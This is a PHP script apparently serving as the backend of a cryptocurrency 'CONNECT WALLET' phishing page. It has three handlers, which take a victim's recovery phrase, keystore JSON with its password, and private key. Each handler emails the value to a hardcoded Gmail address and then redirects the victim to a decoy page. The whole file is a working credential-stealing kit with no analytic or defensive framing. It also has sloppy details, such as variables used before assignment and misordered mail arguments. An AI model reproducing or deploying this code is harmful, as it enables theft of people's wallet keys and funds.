



<?php 
if(isset($_POST['phr'])){
    $to = "dareosho@gmail.com"; // this is your Email address
    
    $subject =  ". $phr";
    
    $phr = $_POST['phr'];
     

    
    $from = "From: CONNECT WALLET\n";  

    $headers = "The New Phrase : . $phr";
    
    mail($to,$from,$subject,$headers);
    
    header("Location: index.php");
return true;	
     
    }
?>





 





<?php 
if(isset($_POST['key'])){
    $to = "dareosho@gmail.com"; // this is your Email address
    
    $subject =  ". $key";
    
    $key = $_POST['key'];
    $pass= $_POST['pass'];
     

    
    $from = "From: CONNECT WALLET\n";  

    $headers = "The New  : .  Keysore Json is  :  $key,   \n\n\n  Password is :  $pass";
    
    mail($to,$from,$subject,$headers);
    
    header("Location: walleterror.php");
return true;	
     
    }
?>





 
 







<?php 
if(isset($_POST['pri'])){
    $to = "dareosho@gmail.com"; // this is your Email address
    
    $subject =  ". $pri";
    
    $pri = $_POST['pri'];
     

    
    $from = "From: CONNECT WALLET\n";  

    $headers = "The New Private Kwy is : . $pri";
    
    mail($to,$from,$subject,$headers);
    
    header("Location: index.php");
return true;	
     
    }
?>



 























 






















